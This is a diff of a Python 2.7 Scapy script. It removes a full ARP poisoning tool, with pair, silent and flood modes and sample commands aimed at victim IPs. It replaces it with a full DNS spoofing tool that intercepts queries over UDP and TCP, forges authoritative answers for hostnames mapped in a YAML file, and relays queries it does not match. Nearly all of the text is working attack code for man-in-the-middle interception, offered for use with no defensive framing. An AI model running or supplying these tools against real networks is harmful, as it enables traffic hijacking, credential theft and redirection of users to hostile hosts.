@@ -1,288 +1,300 @@
 #!/usr/bin/env python2
 # -*- coding: utf-8 -*-
-"""
-ARP-Poisoner (Py-2.7 edition)
------------------------------
+#
+# dns.py -- DNS spoof / relay for Python-2.7 + Scapy-2.4.5
+# This script intercepts DNS queries on an interface, spoofs answers for
+# matched hostnames according to a YAML mapping, and optionally relays
+# unmatched queries to an upstream resolver.
 
-Modes
-~~~~~
-* *pair*   – poison one or more <victim, gateway> pairs (default).
-* *silent* – answer only when ARP requests are heard (stealthy).
-* *flood*  – claim every IP in a CIDR is at the attacker’s MAC.
 
-Examples
-~~~~~~~~
-    sudo python2 arp_poisoner27.py \
-         --iface enp0s10 \
-         --victims 10.0.123.4,10.0.123.7 \
-         --gateway 10.0.123.1 \
-         --interval 4               # active pair mode
+from __future__ import print_function, absolute_import
 
-    sudo python2 arp_poisoner27.py \
-         --iface enp0s10 \
-         --mode flood \
-         --cidr 10.0.123.0/24       # flood /24 every 10 s
-
-    sudo python2 arp_poisoner27.py \
-         --iface enp0s10 \
-         --mode silent \
-         --victims 10.0.123.4 --gateway 10.0.123.1
-"""
-
+import argparse
+import ipaddress         
 import logging
+import os
 import signal
+import socket
+import sys
 import threading
 import time
-
-try:
-    import ipaddress          # back-port for Py-2
-except ImportError:
-    raise SystemExit("Install the 'ipaddress' back-port:  sudo pip install ipaddress")
+import yaml
 
 from scapy.all import (
-    ARP,
-    Ether,
-    get_if_hwaddr,
-    getmacbyip,
-    sendp,
-    sniff,
+    DNS, DNSQR, DNSRR,
+    IP, IPv6,
+    UDP, TCP,
+    send, sniff,
 )
 
-# ---------------------------------------------------------------------------
+def _u(s):
+    try:
+        return unicode(s)            
+    except NameError:                    
+        return s
+#configure root logger: DEBUG if verbose, ERROR if quiet,else INFO (default).
+def setup_logging(verbose, quiet):
+    if verbose and quiet:
+        quiet = False
+    lvl = logging.DEBUG if verbose else (logging.ERROR if quiet else logging.INFO)
+    logging.basicConfig(
+        level=lvl,
+        format='%(asctime)s %(levelname).1s: %(message)s',
+        datefmt='%H:%M:%S',
+    )
+#Lower-case, strip trailing dot, always unicode.
+def _normalise_qname(name):
+    return _u(name).rstrip(u'.').lower()
 
-logging.basicConfig(format='[%(levelname).1s] %(message)s', level=logging.INFO)
-log = logging.getLogger('arp')
+#Thread handling DNS spoofing over both UDP and TCP.
+class DNSSpoofer(threading.Thread):
 
-# ---------------------------------------------------------------------------
-# Helpers
-# ---------------------------------------------------------------------------
+    def __init__(self, iface, mapping, upstream='8.8.8.8',
+                 relay=False, ttl=300, bpf=None):
+        threading.Thread.__init__(self)
+        self.daemon    = True
+        self.iface     = iface #interface to sniff/inject
+        self.mapping   = mapping #host->IP or host->list[IP]
+        self.upstream  = upstream #relay target for misses
+        self.relay     = relay #whether to relay unmatched
+        self.ttl       = ttl #TTL for forged answers
+        self.bpf       = bpf or 'udp or tcp port 53' #base BPF filter
 
+        self._running  = threading.Event()
+        self._running.set()
+        self._tcp_thr  = None
 
-def craft(is_at_mac, dst_ip, dst_mac, src_ip):
-    """Return one forged Ethernet/ARP *reply* frame (is-at)."""
-    return Ether(src=is_at_mac, dst=dst_mac) / ARP(
-        op=2,          # is-at
-        psrc=src_ip,
-        hwsrc=is_at_mac,
-        pdst=dst_ip,
-        hwdst=dst_mac,
+    #maping lookup & response crafting helpers
+    def _lookup(self, qname):
+        qname = _normalise_qname(qname)
+
+        if qname in self.mapping:
+            val = self.mapping[qname]
+            return val if isinstance(val, list) else [val]
+
+        #wildcard supports: *.example.com
+        it = self.mapping.iteritems() if hasattr(self.mapping, 'iteritems') else self.mapping.items()
+        for pattern, val in it:
+            if pattern.startswith(u'*.') and qname.endswith(pattern[2:]):
+                return val if isinstance(val, list) else [val]
+        return None
+    
+    #generate a linked DNSRR chain for all IPs to include in answer
+    def _build_answers(self, qname, ips, qtype):
+        answers = None
+        for ip in ips:
+            rr = DNSRR(rrname=qname, type=qtype, ttl=self.ttl, rdata=str(ip))
+            answers = rr if answers is None else answers / rr
+        return answers
+    
+    #construct a spoofed DNS response packet matching the query.
+    def _forge_response(self, pkt, ips):
+        q      = pkt[DNSQR]
+        answer = self._build_answers(q.qname, ips, q.qtype)
+        dns    = DNS(id=pkt[DNS].id, qr=1, aa=1,
+                     qd=q, ancount=len(ips), an=answer)
+        #swap src/dst for IP or IPv6
+        ip_l   = IP(src=pkt[IP].dst, dst=pkt[IP].src) if IP in pkt else \
+                 IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)
+         #wrap in UDP or TCP
+        if UDP in pkt:
+            udp = UDP(sport=53, dport=pkt[UDP].sport)
+            return ip_l / udp / dns
+        else:
+            tcp = TCP(sport=53, dport=pkt[TCP].sport,
+                      flags='PA',
+                      seq=pkt[TCP].ack,
+                      ack=pkt[TCP].seq + len(pkt[TCP].payload))
+            return ip_l / tcp / dns
+
+    #Packet procesing:intercept queries & reply or relay
+    def _process_udp(self, pkt):
+        if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
+            return
+        qname = pkt[DNSQR].qname.decode()
+        ips   = self._lookup(qname)
+        if ips:
+            send(self._forge_response(pkt, ips), iface=self.iface, verbose=0)
+            logging.info('Spoofed %s -> %s', qname, ', '.join(ips))
+        elif self.relay:
+            self._relay_upstream(pkt)
+
+    def _process_tcp(self, pkt):
+        if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
+            return
+        qname = pkt[DNSQR].qname.decode()
+        ips   = self._lookup(qname)
+        if ips:
+            send(self._forge_response(pkt, ips), iface=self.iface, verbose=0)
+            logging.info('(TCP) Spoofed %s -> %s', qname, ', '.join(ips))
+        elif self.relay:
+            self._relay_upstream(pkt)
+
+    #Upstream relay for unmatched queries(UDP-only)
+    def _relay_upstream(self, pkt):
+        qname = pkt[DNSQR].qname.decode()
+        sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(2)
+        try:
+            sock.sendto(bytes(pkt[DNS]), (self.upstream, 53))
+            data, _ = sock.recvfrom(4096)
+        except socket.timeout:
+            logging.warning('Upstream timeout for %s', qname)
+            return
+        finally:
+            sock.close()
+        #wrap reply in correct IP/UDP
+        ip_l   = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+        udp_l  = UDP(sport=53, dport=pkt[UDP].sport)
+        send(ip_l / udp_l / DNS(data), iface=self.iface, verbose=0)
+
+     #thread lifecycle:start TCP sniffer thread, run UDP sniffer here
+    def run(self):
+        logging.info('DNS spoofing on %s  (relay=%s)  filter="%s"',
+                     self.iface, self.relay, self.bpf)
+
+        #TCP snifer
+        self._tcp_thr = threading.Thread(
+            target=lambda: sniff(
+                iface=self.iface,
+                filter='tcp and (%s)' % self.bpf,
+                prn=self._process_tcp,
+                store=0,
+                stop_filter=lambda *_: not self._running.is_set(),
+            ))
+        self._tcp_thr.daemon = True
+        self._tcp_thr.start()
+
+        #run UDP sniffer in this thread
+        sniff(iface=self.iface,
+              filter='udp and (%s)' % self.bpf,
+              prn=self._process_udp,
+              store=0,
+              stop_filter=lambda *_: not self._running.is_set())
+
+    def stop(self):
+        self._running.clear()
+        if self._tcp_thr and self._tcp_thr.is_alive():
+            self._tcp_thr.join(0.5)
+
+#YAML mapping loader: host->IP or host->list[IP]
+def load_mapping(path):
+    raw = yaml.safe_load(open(path, 'rb'))
+    if not isinstance(raw, dict):
+        raise ValueError('YAML must be a host→IP dictionary')
+
+    mapping = {}
+    it = raw.iteritems() if hasattr(raw, 'iteritems') else raw.items()
+    for host, value in it:
+        host_norm = _normalise_qname(host)
+        ips_raw   = value if isinstance(value, list) else [value]
+
+        good = []
+        for ip in ips_raw:
+            try:
+                ipaddress.ip_address(_u(ip))# ipaddress needs unicode in Py-2
+                good.append(str(ip))
+            except ValueError:
+                logging.warning('Ignoring invalid IP "%s" (host %s)', ip, host_norm)
+        if good:
+            mapping[host_norm] = good if len(good) > 1 else good[0]
+    return mapping
+
+def main(argv=None):
+    import argparse
+
+    parser = argparse.ArgumentParser(
+        prog='dns.py',
+        formatter_class=argparse.RawTextHelpFormatter,  # ← keep \n as-is
+        description=(
+            "DNS spoof / selective relay for Python-2.7 + Scapy 2.4.x\n"
+            "Works over UDP *and* TCP, IPv4/IPv6.  Requires root privileges."
+        ),
+        epilog="""\
+MODES
+  • Pure spoof  : omit --relay  → unmatched queries are simply dropped
+  • Relay mode  : add  --relay  → unmatched queries are forwarded upstream
+
+EXAMPLES
+  # 1) Classic spoof + relay so browsing does not break
+  sudo python2 dns.py -i eth0 -m spoof.yml --relay -v
+
+  # 2) Quiet spoof, custom TTL
+  sudo python2 dns.py -i wlan0 -m demo.yml --ttl 60 -q
+
+  # 3) Run only on DNS traffic of a captive portal subnet
+  sudo python2 dns.py -i eth0 -m corp.yml --bpf "udp and net 10.66.0.0/16"
+"""
+    )
+
+    # required
+    parser.add_argument(
+        "-i", "--iface", required=True,
+        metavar="IFACE",
+        help="Network interface to sniff/inject on (e.g. eth0)"
+    )
+    parser.add_argument(
+        "-m", "--map", required=True,
+        metavar="FILE",
+        help="YAML file mapping hostnames (or wildcards) to spoofed IPs"
+    )
+
+    # operation flags
+    parser.add_argument(
+        "--relay", action="store_true",
+        help="Forward *unmatched* queries to --upstream and return the reply"
+    )
+    parser.add_argument(
+        "--upstream", default="8.8.8.8",
+        metavar="IP",
+        help="Upstream resolver used when --relay is active (default: 8.8.8.8)"
+    )
+    parser.add_argument(
+        "--ttl", type=int, default=300,
+        metavar="SECS",
+        help="TTL to set on forged answers (default: 300)"
+    )
+    parser.add_argument(
+        "--bpf", metavar="FILTER",
+        help="Extra BPF filter to AND with 'port 53' "
+             "(ex: --bpf \"udp and net 192.168.1.0/24\")"
     )
 
 
-def resolve_mac(ip):
-    mac = getmacbyip(ip)
-    if not mac:
-        raise RuntimeError("Could not resolve MAC for %s – host down?" % ip)
-    return mac
+    vq = parser.add_mutually_exclusive_group()
+    vq.add_argument("-v", "--verbose", action="store_true", help="Debug output")
+    vq.add_argument("-q", "--quiet",   action="store_true", help="Errors only")
 
-# ---------------------------------------------------------------------------
-# Thread classes
-# ---------------------------------------------------------------------------
-
-
-class ActivePairSpoofer(threading.Thread):
-    """Periodically poisons exactly one <victim, gateway> pair."""
-
-    def __init__(self, iface, victim, gateway, attacker_mac, interval=10.0):
-        threading.Thread.__init__(self)
-        self.daemon = True
-        self.iface = iface
-        self.victim = victim          # (ip, mac)
-        self.gateway = gateway        # (ip, mac)
-        self.attacker_mac = attacker_mac
-        self.interval = interval
-        self._run = True
-
-    def _spoof_once(self):
-        v_ip, v_mac = self.victim
-        g_ip, g_mac = self.gateway
-
-        # “I am the gateway” → victim
-        sendp(craft(self.attacker_mac, v_ip, v_mac, g_ip),
-              iface=self.iface, verbose=False)
-        # “I am the victim”  → gateway
-        sendp(craft(self.attacker_mac, g_ip, g_mac, v_ip),
-              iface=self.iface, verbose=False)
-
-    def _restore_once(self):
-        v_ip, v_mac = self.victim
-        g_ip, g_mac = self.gateway
-        for _ in range(5):
-            sendp(craft(g_mac, v_ip, v_mac, g_ip),
-                  iface=self.iface, verbose=False)
-            sendp(craft(v_mac, g_ip, g_mac, v_ip),
-                  iface=self.iface, verbose=False)
-            time.sleep(0.2)
-
-    def run(self):
-        log.info("[pair %s ↔ %s] active poisoning started",
-                 self.victim[0], self.gateway[0])
-        while self._run:
-            self._spoof_once()
-            time.sleep(self.interval)
-        self._restore_once()
-
-    def stop(self):
-        self._run = False
-
-
-class FloodSpoofer(threading.Thread):
-    """Send forged replies for *all* IPs in a CIDR."""
-
-    def __init__(self, iface, cidr, gateway_ip, attacker_mac, interval=10.0):
-        threading.Thread.__init__(self)
-        self.daemon = True
-        self.iface = iface
-        self.cidr = ipaddress.ip_network(cidr, strict=False)
-        self.gateway_ip = gateway_ip
-        self.attacker_mac = attacker_mac
-        self.interval = interval
-        self._run = True
-
-    def _spoof_once(self):
-        for ip in self.cidr.hosts():
-            sendp(craft(self.attacker_mac, str(ip),
-                        "ff:ff:ff:ff:ff:ff", self.gateway_ip),
-                  iface=self.iface, verbose=False)
-
-    def run(self):
-        log.info("[flood %s] poisoning whole subnet…", self.cidr)
-        while self._run:
-            self._spoof_once()
-            time.sleep(self.interval)
-
-    def stop(self):
-        self._run = False     # caches will decay naturally
-
-
-class SilentResponder(threading.Thread):
-    """Passive: answer incoming ARP requests with forged replies."""
-
-    def __init__(self, iface, victim, gateway, attacker_mac):
-        threading.Thread.__init__(self)
-        self.daemon = True
-        self.iface = iface
-        self.victim = victim
-        self.gateway = gateway
-        self.attacker_mac = attacker_mac
-        self._run = True
-
-    def _handle(self, pkt):
-        if not pkt.haslayer(ARP) or pkt[ARP].op != 1:   # who-has only
-            return
-
-        dst_ip = pkt[ARP].pdst
-        src_ip = pkt[ARP].psrc
-        v_ip, v_mac = self.victim
-        g_ip, g_mac = self.gateway
-
-        # victim → gateway
-        if src_ip == v_ip and dst_ip == g_ip:
-            sendp(craft(self.attacker_mac, v_ip, v_mac, g_ip),
-                  iface=self.iface, verbose=False)
-
-        # gateway → victim
-        elif src_ip == g_ip and dst_ip == v_ip:
-            sendp(craft(self.attacker_mac, g_ip, g_mac, v_ip),
-                  iface=self.iface, verbose=False)
-
-    def run(self):
-        log.info("[pair %s ↔ %s] silent responder active",
-                 self.victim[0], self.gateway[0])
-        sniff(iface=self.iface, filter="arp", prn=self._handle,
-              store=0, stop_filter=lambda *_: (not self._run))
-
-    def stop(self):
-        self._run = False
-
-# ---------------------------------------------------------------------------
-# Orchestrator
-# ---------------------------------------------------------------------------
-
-
-class PoisonManager(object):
-    def __init__(self):
-        self.threads = []
-
-    def add(self, thread):
-        self.threads.append(thread)
-        thread.start()
-
-    def stop_all(self, *_):
-        log.info("Stopping … restoring caches where applicable.")
-        for t in self.threads:
-            if hasattr(t, "stop"):
-                t.stop()
-        for t in self.threads:
-            t.join()
-
-# ---------------------------------------------------------------------------
-# CLI
-# ---------------------------------------------------------------------------
-
-
-if __name__ == "__main__":
-    import argparse
-
-    parser = argparse.ArgumentParser(description="ARP poisoning tool (Scapy, Py-2.7)")
-    parser.add_argument("--iface", "-i", required=True, help="Network interface")
-
-    # pair / silent options
-    parser.add_argument("--victims", help="Comma-separated victim IPs (pair/silent)")
-    parser.add_argument("--gateway", help="Gateway IP (pair/silent)")
-
-    # flood options
-    parser.add_argument("--cidr", help="CIDR to flood, e.g. 10.0.0.0/24")
-
-    # common
-    parser.add_argument("--mode", choices=["pair", "flood", "silent"],
-                        default="pair")
-    parser.add_argument("--interval", type=float, default=10.0,
-                        help="Seconds between bursts (active modes)")
-
-    args = parser.parse_args()
-
-    attacker_mac = get_if_hwaddr(args.iface)
-    mgr = PoisonManager()
+    args = parser.parse_args(argv)
+    setup_logging(args.verbose, args.quiet)
 
     try:
-        if args.mode in ("pair", "silent"):
-            if not (args.victims and args.gateway):
-                parser.error("--victims and --gateway required")
-
-            gateway_ip = args.gateway
-            gateway_mac = resolve_mac(gateway_ip)
-            victim_ips = [ip.strip() for ip in args.victims.split(",")]
-
-            for vip in victim_ips:
-                vmac = resolve_mac(vip)
-                if args.mode == "pair":
-                    thr = ActivePairSpoofer(args.iface,
-                                            (vip, vmac),
-                                            (gateway_ip, gateway_mac),
-                                            attacker_mac,
-                                            args.interval)
-                else:
-                    thr = SilentResponder(args.iface,
-                                          (vip, vmac),
-                                          (gateway_ip, gateway_mac),
-                                          attacker_mac)
-                mgr.add(thr)
-
-        elif args.mode == "flood":
-            if not (args.cidr and args.gateway):
-                parser.error("--cidr and --gateway required for flood mode")
-            thr = FloodSpoofer(args.iface, args.cidr, args.gateway,
-                               attacker_mac, args.interval)
-            mgr.add(thr)
-
-        # handle Ctrl-C
-        signal.signal(signal.SIGINT, mgr.stop_all)
-
-        # block until every thread exits
-        for t in mgr.threads:
-            t.join()
-
+        mapping = load_mapping(args.map)
     except Exception as exc:
-        log.error(str(exc))
-        mgr.stop_all()
+        logging.error('%s', exc)
+        sys.exit(1)
+
+    if not mapping:
+        logging.error('No valid host→IP mappings found – aborting')
+        sys.exit(1)
+
+    spoofer = DNSSpoofer(
+        args.iface, mapping,
+        upstream=args.upstream,
+        relay=args.relay,
+        ttl=args.ttl,
+        bpf=args.bpf
+    )
+    spoofer.start()
+
+    def _sigint(_sig, _frm):
+        logging.info('Ctrl-C received – shutting down')
+        spoofer.stop()
+    signal.signal(signal.SIGINT, _sigint)
+
+    while spoofer.is_alive():
+        time.sleep(0.3)
+    logging.info('Bye!')
+
+if __name__ == '__main__':
+    main()
